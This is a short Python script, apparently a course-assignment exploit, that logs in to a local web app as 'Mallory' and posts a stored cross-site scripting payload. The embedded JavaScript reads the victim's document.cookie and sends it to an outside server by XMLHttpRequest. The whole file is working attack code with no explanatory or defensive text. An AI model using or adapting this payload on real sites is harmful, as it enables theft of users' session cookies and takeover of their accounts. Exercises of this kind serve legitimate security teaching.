import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# bad script
script = """<script>
var base = "https://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/03/server/token.php?utorid=dongyues&";
var param = document.cookie;
var theUrl = base.concat(param);
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", theUrl, false );
xmlHttp.send();
</script>"""

with requests.Session() as s:
    # sing-in as mallory
    res = s.post(BASE + '/signin.php', data=mallory)
    # post a message (GET request)
    res = s.get(BASE + '/post.php', params={'msg': script})    